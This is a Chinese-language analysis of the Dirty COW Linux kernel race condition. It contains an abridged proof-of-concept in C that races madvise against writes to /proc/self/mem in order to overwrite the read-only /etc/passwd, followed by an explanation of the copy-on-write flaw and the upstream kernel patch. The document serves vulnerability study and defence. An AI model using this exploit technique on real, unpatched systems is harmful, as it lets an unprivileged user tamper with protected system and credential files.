# Dirty COW Analysis
## POC

POC很简单：
* 主进程只读打开权限文件，并mmap到map地址，权限是READ & PRIVATE
* madvise进程不停释放map对应的内存页，madvise(map, 100, MADV\_DONNTNEED)
* procselfmem进程以O\_RDWR权限代开/proc/self/mem伪文件，试图写入任何内容到权限文件

```c
void * map;
void * madviseThread(void * arg) {
    while(1) {
    madvise(map, 100, MADV_DONNTNEED);
    }
}
void * procselfmemThread(void * arg) {
    int f = open("/proc/self/mem", O_RDWR);
    lseek(f, map, SEEK_SET);
    write(f, arg, strlen(arg));
}

int main() {
    f = open("/etc/passwd", O_RDONLY);
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    pthread_create(&pth1, NULL, madviseThread, "");
    pthread_create(&pth2, NULL, procselfmemThread, "anything");
    pthread_join(&pth1, NULL);
    pthread_join(&pth2, NULL);
    return 0;
}
```

## 核心代码分析

* 核心逻辑：
- write("/proc/self/mem", map, "anything")时，会触发核心的内存页管理系统。
  - 首次，缺页并调页(page in)
  - 第二次，页表没有写权限，去处FOLL\_WRITE请求标志(这是合理的：因为open成功了，说明可以写，页表的权限不可写也是自洽的，例如copy-on-write)。
  - 第三次，去除FOLL\_WRITE标志请求页面，成功请求。
* BUG逻辑：
  - 首次，缺页并调页(page in)
  - 第二次，页表没有写权限，去处FOLL\_WRITE请求标志(这是合理的：因为open成功了，说明可以写，页表的权限不可写也是自洽的，例如copy-on-write)。
  - madvise清空map的页表项
  - 第三次，去除FOLL\_WRITE(只读访问)，发现缺页，调页(page in)
  - 第四次，只读访问获取页面，并成功写入"anything"，置页表项标志为脏
  - 最后写回文件

## Patch

```c
diff --git a/include/linux/mm.h b/include/linux/mm.h
index e9caec6..ed85879 100644
--- a/include/linux/mm.h
+++ b/include/linux/mm.h
@@ -2232,6 +2232,7 @@ static inline struct page *follow_page(struct vm_area_struct *vma,
 #define FOLL_TRIED	0x800	/* a retry, previous pass started an IO */
 #define FOLL_MLOCK	0x1000	/* lock present pages */
 #define FOLL_REMOTE	0x2000	/* we are working on non-current tsk/mm */
+#define FOLL_COW	0x4000	/* internal GUP flag */
 
 typedef int (*pte_fn_t)(pte_t *pte, pgtable_t token, unsigned long addr,
 			void *data);
diff --git a/mm/gup.c b/mm/gup.c
index 96b2b2f..22cc22e 100644
--- a/mm/gup.c
+++ b/mm/gup.c
@@ -60,6 +60,16 @@ static int follow_pfn_pte(struct vm_area_struct *vma, unsigned long address,
 	return -EEXIST;
 }
 
+/*
+ * FOLL_FORCE can write to even unwritable pte's, but only
+ * after we've gone through a COW cycle and they are dirty.
+ */
+static inline bool can_follow_write_pte(pte_t pte, unsigned int flags)
+{
+	return pte_write(pte) ||
+		((flags & FOLL_FORCE) && (flags & FOLL_COW) && pte_dirty(pte));
+}
+
 static struct page *follow_page_pte(struct vm_area_struct *vma,
 		unsigned long address, pmd_t *pmd, unsigned int flags)
 {
@@ -95,7 +105,7 @@ retry:
 	}
 	if ((flags & FOLL_NUMA) && pte_protnone(pte))
 		goto no_page;
-	if ((flags & FOLL_WRITE) && !pte_write(pte)) {
+	if ((flags & FOLL_WRITE) && !can_follow_write_pte(pte, flags)) {
 		pte_unmap_unlock(ptep, ptl);
 		return NULL;
 	}
@@ -412,7 +422,7 @@ static int faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,
 	 * reCOWed by userspace write).
 	 */
 	if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))
-		*flags &= ~FOLL_WRITE;
+	        *flags |= FOLL_COW;
 	return 0;
 }
```
